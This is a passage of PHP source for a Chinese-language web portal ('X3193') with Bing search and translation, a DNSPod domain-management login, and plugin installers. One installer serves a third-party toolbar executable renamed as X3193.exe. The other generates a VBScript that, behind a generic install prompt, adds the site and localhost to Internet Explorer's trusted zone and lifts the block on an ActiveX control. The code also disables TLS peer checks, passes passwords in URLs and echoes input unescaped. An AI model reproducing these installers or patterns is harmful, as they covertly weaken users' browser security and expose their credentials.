                                $nodelink = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:Url"),"1"))->item(0)->nodeValue)." "));
                                $nodeDisplayUrl = str_replace('"', "",trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName(arrmember(split("[:]","mw:DisplayUrl"),"1"))->item(0)->nodeValue)." "));
                                print_r("<li>"." "."<a style='' href='".$nodelink."' title='".$nodelink."' title='".$nodelink." ".$sCrLf.$nodedescript." ".$sCrLf.$nodeDateTime."' target='_blank'>".$nodetitle."</a></li>");
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodetitle));?>&description=<?php  echo encodeuri(iconv('gb2312','utf-8',$nodedescript))?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                                
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if ($objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue > 1000){
                                $totalitem = 1000;
                        }       
                        else{
                                $totalitem = $objXml->getElementsByTagName(arrmember(split("[:]","news:Total"),"1"))->item(0)->nodeValue;
                        }       
                        if (fmod($totalitem, $pagesize) == 0){
                                $totalpage=$totalitem/$pagesize;
                        }       
                        else{
                                $totalpage=ceil($totalitem/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                -*      <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // MobileWeb if end
                elseif (strpos($Sources,"Translation") !== false){ // translate if start
                        $targetlang = "Ar|zh-CHS|zh-CHT|Nl|En|Fr|De|It|Ja|Ko|Pl|Pt|Ru|Es"; 
                        $lang = "Arabic|简体中文|繁w中文|Dutch|English|French|German|Italian|Japanese|Korean|Polish|Portuguese|Russian|Spanish"; 
                        $langstr = split("[|]",$lang);
                        $langcharset = "";
                        $strResult = "";
                        $strResultxml = "";
                        $error = '';
                        for ($targetlangi = 0; $targetlangi < count(split("[|]",$targetlang));$targetlangi++){
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                if (0){
                                        $xmlstr = '<?php xml version="1.0" encoding="GBK" ?><?php pageview_candidate?><SearchResponse xmlns="http://schemas.microsoft.com/LiveSearch/2008/04/XML/element" Version="2.2"><Query><SearchTerms>espero</SearchTerms></Query><tra:Translation xmlns:tra="http://schemas.microsoft.com/LiveSearch/2008/04/XML/translation"><tra:Results><tra:TranslationResult><tra:TranslatedTerm>但愿</tra:TranslatedTerm></tra:TranslationResult></tra:Results></tra:Translation></SearchResponse>';
                                }       
                                else{   
                                        $url = "https://api.datamarket.azure.com/Bing/Search/xml.aspx?AppId=".encodeuri($BingAppId)."&Market=".encodeuri(trim(request("market")))."&Query=".encodeuri(iconv('gb2312','utf-8',$query))."&Sources=".encodeuri($soSources)."&Version=".encodeuri("2.2")."&Options=EnableHighlighting&Translation.SourceLanguage=".trim(request("transfrom"))."&Translation.TargetLanguage=".arrmember(split("[|]",$targetlang),($targetlangi));
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);                
                                }       
                                //echo $xmlstr;
                                //return;
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                // 加Xml 文件    
                                $objXml->loadXML($xmlstr);

                                if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue===null){
                                        break;
                                }
                                elseif ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue){
                                        $objList = $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"));                          
                                        $objHdd = $objList->item(0);
                                        $nodeTerm = $objHdd->getElementsByTagName(arrmember(split("[:]","tra:TranslatedTerm"),"1"))->item(0)->nodeValue." ";

                                        if ($targetlangi == "0")
                                                $strResult = GetGB2312String($nodeTerm);
                                        else
                                                $strResult = $strResult."|".GetGB2312String($nodeTerm);
                                }                               
                        }       
                
                        if (!$objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center">搜 索 结 果</td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索发生意外错误，请重试！
                </td>
        </tr>   
</table>
                        <?php       
                                break;
                        }
                        if ($objXml->getElementsByTagName("SearchTerms")->item(0)->nodeValue && $objXml->getElementsByTagName(arrmember(split("[:]","tra:TranslationResult"),"1"))->item(0)->nodeValue===null){
                        ?>      
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center">搜 索 结 果</td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                搜索未发现任何信息！
                </td>
        </tr>   
</table>
                        <?php       
                                break;                  
                        }
                        ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3">搜 索 结 果 : 共 <?php  echo count(split("[|]",$strResult));?> 条 </td>
        </tr>   
                        <?php 
                        $transstr = split("[|]",$strResult);                                            
                        for($i=0; $i < count(split("[|]",$strResult));$i++){
                                ?>                              
        <tr class="tdbg">
                <td align="left" id="result">
                                <?php 
                                echo "<li>".($i+1)." ".$langstr[$i]." -> ".$transstr[$i]."</li>";
                                ?>
                </td>
                <td align="center" width="17%"> 
                        <A style='' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self></A>
                </td>
        </tr>   
                                <?php                       
                        }
                        ?>
        <tr class="tdbg">
                        <?php 
                        if (fmod(count(split("[|]",$strResult)), $pagesize) == 0){
                                $totalpage = count(split("[|]",$strResult))/$pagesize;
                        }       
                        else{
                                $totalpage=ceil(count(split("[|]",$strResult))/$pagesize);
                        }       

                        ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页".$sCrlf.' ';
                        if (floor($page) > 1)
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                        if (floor($page) > 0 && floor($page) < floor($totalpage))
                                echo "<a style='' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                        $gotopage->CallPageChange();
                        
                        ?>
                </td>
        </tr>   
</table>                        
                <?php 
                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                } // translate if end
                
                } // qurey if end       
                break;
} // case end

$style->footer();
return;
} // bing function end
?>

<?php 
function ieshow(){
header('Content-Type:application/octet-stream');
header('Content-Disposition: attachment; filename="X3193.exe"');
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'http://ieshow.net/Clients/200608/xcy6272003/Release/00.00.000/xcy6272003Toolbar.exe');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
curl_setopt($ch, CURLOPT_TIMEOUT, 10000);
$xmlstr = curl_exec($ch);
curl_close($ch);
echo $xmlstr;
exit;
}
?>

<?php 
function setup(){
if (trim(request('code'))==''){

        header('Content-Type:application/octet-stream');
        header('Content-Disposition: attachment; filename="X3193.zip"');

        if(!file_exists('./X3193.zip')){
                touch ('./Setup.html');
                $handle = fopen ('./Setup.html', 'w+');
                rewind ($handle);
                $ch = curl_init();
                $url = httppath()."?api=setup&code=vbs";
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                $xmlstr = curl_exec($ch);
                curl_close($ch);
                fwrite ($handle, '<script language="vbscript">'.chr(13).chr(10));
                fwrite ($handle, $xmlstr);
                fwrite ($handle, chr(13).chr(10).'</script>');
                fclose ($handle);


                $zip = new zipfile();
                $handle = fopen("./Setup.html", "rb");
                $string = fread($handle, filesize("./Setup.html"));
                fclose($handle);        
                $zip->addFile($string, "Setup.html");
                $string = $zip->file();
                $handle = fopen("./X3193.zip", "wb");
                fwrite($handle, $string);
                fclose($handle);        
        }

        $ch = curl_init();
        $url = httppathdir()."/X3193.zip";
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        $xmlstr = curl_exec($ch);
        curl_close($ch);
        echo $xmlstr;

        unlink('./Setup.html');
        unlink('./X3193.zip');
}
else{
        //header('application/octet-stream');
        //header('Content-Disposition: attachment; filename="setup.html"');

        //<script language="vbscript">
        $zone = "";
        $subzone = "";
        if (stripos($_SERVER['SERVER_NAME'],'.') == false){
                $zone = $_SERVER['SERVER_NAME'];
                $subzone = "";
        }       
        else{
                if (count(split("[.]",$_SERVER['SERVER_NAME'])) == 3){
                        if (arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "net" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "org" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "com" || arrmember(split("[.]",$_SERVER['SERVER_NAME']),1) != "biz"){
                                $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),1).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),2);
                                $subzone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),0);
                        }       
                        else{
                                $zone = $_SERVER['SERVER_NAME'];
                        }
                }               
                elseif (count(split("[.]",$_SERVER['SERVER_NAME'])) >= 4){
                        $zone = arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-3).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-2).'.'.arrmember(split("[.]",$_SERVER['SERVER_NAME']),count(split("[.]",$_SERVER['SERVER_NAME']))-1);
                }               
        }
        ?>
on error resume next
Set WshShell = CreateObject("WScript.Shell")
        <?php 
        if ($subzone == ""){
        ?>
        if WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") = false or WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") <> 2 then
        <?php 
        }
        else{
        ?>
        if WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") = false or WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") <> 2 then
        <?php 
        }
        ?>
        msgbox "正在安装 X3193 主插件！"
        setupok = MsgBox("是否安装 X3193 主插件！", vbOKCancel, "X3193 - 主插件安装")
        If setupok = vbOK Or setupok = vbYes Then
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""   
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","2","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 搜索插件\", "<?php echo httppathdir()?>?api=bing&action=getinfo"
                'WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 消息插件\", "<?php echo httppathdir()?>?api=imified&action=getinfo"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 相册插件\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('photo.getinfo');?>"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 网址插件\", "<?php echo httppathdir()?>?api=picasa&action=<?php echo encodeuri('urlshortener.getinfo');?>"
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags",""
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","0","REG_DWORD"
                msgbox "X3193 主插件安装成功！"
        Else
                msgbox "X3193 主插件安装操作取消！"
        End If
        <?php 
        if ($subzone == ""){
        ?>
        elseif WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http") = 2 then
        <?php 
        }
        else{
        ?>
        elseif WshShell.Regread("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http") = 2 then
        <?php 
        }
        ?>
        msgbox("正在移除 X3193 主插件！")
        setupok = MsgBox("是否移除 X3193 主插件！", vbOKCancel, "X3193 - 主插件移除")
        If setupok = vbOK Or setupok = vbYes Then
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\<?php echo $zone;?>\<?php echo $subzone;?>\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\",""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\localhost\http","0","REG_DWORD"
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 搜索插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 消息插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 相册插件\", ""
                WshShell.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\MenuExt\X3193 - 网址插件\", ""
                WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Internet Explorer\ActiveX Compatibility\{00000566-0000-0010-8000-00AA006D2EA4}\Compatibility Flags","1024","REG_DWORD"
                msgbox "X3193 主插件移除成功！"
        Else
                msgbox "X3193 主插件移除操作取消！"
        End If
elseif WshShell = false then
        msgbox "X3193 主插件因系统故障安装失败！"
end if
        <?php 
        //</script>
}
exit;
}
?>

<?php 
function safe360(){

//exit;   
}
?>

<?php 
function dnspod(){ // dnspod function start
header('Content-Type: text/html; charset=gb2312');
?>
<head>
<?php 
$style = new css();
$style->ico();
$style->title("X3193 - 域名");
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">            
                        <?php  
                        	 IF(!is_wap())
                        	sellink("主页|插件|搜索|域名|FTP|读书|游戏|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|FTP|短片",$skincolor);
                        ?>
                </td>
        </tr>           
</table>
<?php 

$dnspodu = trim(request("uname"));
$dnspodp = trim(request("pwd"));

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

if ($stract == ""){
        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=main"."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Domain.List"){      
        if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                        if (trim(request("checkcode")) != ""){
                                AlertBack("四位验证码错误！" , 1);
                                break;
                        }       
                        elseif (trim(request("checkcode")) == ""){
                                AlertBack("四位验证码为空！" , 1);
                                break;
                        }
                }       
                redirect(scriptpath()."?api=dnspod&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&action=".trim(request("action"))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        }
        $dnspodu = trim(request("uname"));
        $dnspodp = trim(request("pwd"));
        if (trim(request("logout")) != ""){
                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                session_register("dnspod");
}                 

                $_SESSION["dnspod"]["uname"] = "";      
                $_SESSION["dnspod"]["pwd"] = "";        
                redirect(scriptpath()."?api=dnspod&skin=".$skincolor."&uname=&pwd=&action=&urlflag=1");
                break;
        }
        elseif ($_SESSION["dnspod"]["uname"] != "" && $_SESSION["dnspod"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["dnspod"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["dnspod"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        }       
        elseif (trim(request('uname')) != "" && trim(request('pwd')) != ""){
                session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                session_register("dnspod");
}
                $_SESSION["dnspod"]["uname"] = trim(request("uname"));  
                $_SESSION["dnspod"]["pwd"] = trim(request("pwd"));      
        }       
        elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=&pwd=&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&type=mine");
        }       
}
elseif ($stract == "Domain.Create" && trim($_POST["domain"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domain=".encodeuri(trim(request("domain")))."&refer=".encodeuri(trim(request("refer")))."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Record.Create" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domainid=".encodeuri(trim(request("domainid")))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode")));
        break;
}       
elseif ($stract == "Record.Modify" && trim($_POST["sub_domain"]) != "" && trim($_POST["record_type"]) != "" && trim($_POST["record_line"]) != "" && trim($_POST["value"]) != "" && trim($_POST["ttl"]) != ""){
        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                if (trim(request("checkcode")) != ""){
                        AlertBack("四位验证码错误！" , 1);
                        break;
                }       
                elseif (trim(request("checkcode")) == ""){
                        AlertBack("四位验证码为空！" , 1);
                        break;
                }               
        }

        redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domain_id=".encodeuri(trim(request("domain_id")))."&record_id=".trim(request("record_id"))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&edit=0&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode")));
        break;
}       

$dnspodpwd = base64_decode(trim(request("pwd")));
$dnspoduname = base64_decode(trim(request("uname")));

?>
<table width="90%" height="" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

switch ($stract) {
        case "main": // action - main start
						if ($_SESSION["dnspod"]["uname"] != "" && $_SESSION["dnspod"]["pwd"] != "" && trim(request("uname")) == "" && trim(request("pwd")) == ""){
                redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim($_SESSION["dnspod"]["uname"]))."&pwd=".encodeuri(trim($_SESSION["dnspod"]["pwd"]))."&skin=".$skincolor."&action=".encodeuri(trim("Domain.List"))."&checkcode=".trim(request("checkcode"))."&type=mine");
                break;
        		}        
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php  echo ScriptPath(); ?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35">
                <td align="center">
                        <form action="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.List");?>" method="post" name="dnspod">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="<?php echo $dnspodu; ?>" style="height:20px;width:20%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="<?php  echo encodeuri(trim(request("pwd")));?>" style="height:20px;width:10%;font-size:11px" <?php  $style->input("#FCFC9D",""); ?>> 
                        &nbsp验证码：<input <?php  $style->input("#FCFC9D",""); ?> style="height:20px;font-size:11px" maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" style="height:14px;" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor;?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                // action - main end
                break;
        case "Domain.List": // action - Domain.List start
                $dnspod = new dnspod_class();
                $dnspoddomainlist = $dnspod->dnspoddomainlist($dnspoduname,$dnspodpwd,trim(request('type')),$page,$pagesize);
                //print_r($dnspoddomainlist);
                //return;
                if ($dnspoddomainlist["code"] == '1'){
                }       
                else{
 
                              //AlertBack ($dnspoddomainlist["message"] , 2);           
        											redirect(ScriptPath()."?api=dnspod&pagesize=".encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor."&action=".encodeuri(trim(request("action")))."&domainid=".encodeuri(trim(request("domainid")))."&sub_domain=".encodeuri(trim(request("sub_domain")))."&record_type=".trim(request("record_type"))."&record_line=".trim(request("record_line"))."&value=".encodeuri(trim(request("value")))."&mx=".trim(request("mx"))."&ttl=".trim(request("ttl"))."&refer=".encodeuri(trim(request("refer")))."&topdomain=".encodeuri(trim(request("topdomain")))."&checkcode=".trim(request("checkcode"))."&logout=1");
        											break;
                }
                //return;
                
                if ($dnspoddomainlist['length'] == $pagesize) $strpagesize = $pagesize; else $strpagesize = $dnspoddomainlist['length'];
                ?>
<script language="JavaScript" type="text/javascript">
function selitemall()
{
 i=<?php echo $strpagesize*($page-1);?>;
 while(eval('document.dnspod.chidd'+i))
 {
  eval('document.dnspod.chidd'+i).checked = document.dnspod.allitem.checked;
  i++;
 }
}
function delitem()
{
 if(!confirm('确定删除选中的域名吗?')) return;
